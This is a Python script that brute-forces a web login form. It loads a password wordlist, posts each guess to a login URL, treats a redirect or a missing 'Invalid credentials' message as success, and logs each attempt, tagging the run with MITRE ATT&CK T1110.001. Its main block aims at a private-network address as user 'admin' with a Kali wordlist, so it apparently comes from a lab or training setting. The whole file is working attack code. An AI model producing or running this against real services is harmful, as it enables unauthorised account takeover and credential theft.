import requests
import datetime
import threading
import queue


def try_login(url, username, password, timeout, success_indicator, fail_indicator):
    """
    POST credentials to the login form.
    Returns True if login succeeded, False if failed, None on error.
    """
    try:
        resp = requests.post(
            url,
            data={"username": username, "password": password},
            timeout=timeout,
            allow_redirects=False,
        )
        # Success: server redirects away from login page
        if resp.status_code in (301, 302):
            return True
        # Failure: login page returned with error text
        if fail_indicator and fail_indicator in resp.text:
            return False
        # Fallback: if a success string is present in the body
        if success_indicator and success_indicator in resp.text:
            return True
        return False
    except requests.exceptions.RequestException:
        return None


def run_web_attack(url, username, wordlist_path, timeout, log_queue, stop_event):
    """
    Sequentially try every password from the wordlist against the login form.
    Puts log messages into log_queue. Puts DONE when finished.
    """
    try:
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        log_queue.put(f"ERROR: Could not load wordlist — {e}")
        log_queue.put("DONE")
        return {"found": None, "total": 0, "failed": 0}

    total = len(passwords)
    log_queue.put(f"INFO: Target    → {url}")
    log_queue.put(f"INFO: Username  → {username}")
    log_queue.put(f"INFO: Passwords → {total}")
    log_queue.put("INFO: Attack started")

    found = None

    for i, password in enumerate(passwords, 1):
        if stop_event.is_set():
            log_queue.put("INFO: Attack stopped by user")
            break

        ts = datetime.datetime.now().strftime("%H:%M:%S")
        result = try_login(
            url=url,
            username=username,
            password=password,
            timeout=timeout,
            success_indicator=None,
            fail_indicator="Invalid credentials",
        )

        if result is True:
            found = password
            log_queue.put(f"SUCCESS [{i:03d}] {ts} — Password found: {password}")
            break
        elif result is False:
            log_queue.put(f"FAILED  [{i:03d}] {ts} — {password}")
        else:
            log_queue.put(f"ERROR   [{i:03d}] {ts} — {password} (no response)")

    log_queue.put(f"INFO: Attack complete — {'CRACKED: ' + found if found else 'not found'}")
    log_queue.put(f"INFO: MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing (HTTP)")
    log_queue.put("DONE")

    return {
        "found": found,
        "total": total,
        "failed": i - (1 if found else 0),
    }


if __name__ == "__main__":
    import queue as q

    lq = q.Queue()
    stop = threading.Event()

    run_web_attack(
        url="http://172.22.229.213:8888/login.php",
        username="admin",
        wordlist_path="/home/kali/wordlist.txt",
        timeout=5,
        log_queue=lq,
        stop_event=stop,
    )

    while not lq.empty():
        print(lq.get())
